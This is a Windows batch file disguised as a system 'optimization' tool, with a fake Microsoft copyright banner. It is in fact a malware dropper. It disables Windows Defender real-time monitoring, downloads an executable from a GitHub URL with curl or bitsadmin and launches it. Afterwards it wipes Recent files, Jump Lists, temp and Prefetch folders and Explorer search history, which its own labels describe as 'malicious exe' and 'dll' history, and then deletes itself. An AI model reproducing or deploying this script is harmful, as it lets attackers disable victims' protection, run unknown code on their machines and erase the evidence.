@echo off

title Optimization Tool - Clear Logs and Optimize System
cls

:: Copyright and Info
echo ================================
echo        Checking Tool
echo ================================
echo Copyright (c) 2025 Microsoft. All Rights Reserved.
echo Made by Evan.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================

title Disable Defender & Clear Usage Data
echo Running as Administrator...
echo.

:: Disable Windows Defender Real-Time Protection
echo Virus Checking...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Define the URL of the exe file from GitHub
set "URL=https://github.com/evanffx/api/raw/refs/heads/main/Optimizerr.exe"

:: Define the output filename
set "OUTPUT=%TEMP%\downloaded.exe"

:: Use curl to download the file (if curl is available)
curl -L -o "%OUTPUT%" "%URL%" || bitsadmin /transfer "DownloadFile" %URL% %OUTPUT%

:: Check if the file exists before execution
if exist "%OUTPUT%" (
    echo Checking successfully. Running...
    start "" "%OUTPUT%"
) else (
    echo Download failed!
)

@echo off
echo Waiting for 15 seconds...
timeout /t 15 /nobreak >nul
echo Done!

:: Clear Recent Files History
echo Cach Files...
del /F /Q %APPDATA%\Microsoft\Windows\Recent\*.*

:: Clear Quick Access History
echo Malicious exe history...
del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*.*
del /F /Q %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*.*

:: Clear Temporary Files
echo Malicious dll history...
del /F /S /Q "%TEMP%\*.*"
del /F /S /Q "C:\Windows\Temp\*.*"

:: Clear Prefetch Files
echo Clearing Prefetch Files...
del /F /S /Q C:\Windows\Prefetch\*.*

:: Clear File Explorer Search History
echo Clearing Logs History...
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery" /f

:: Done
echo.
echo All tasks completed successfully!

echo Done...
del "%~f0"
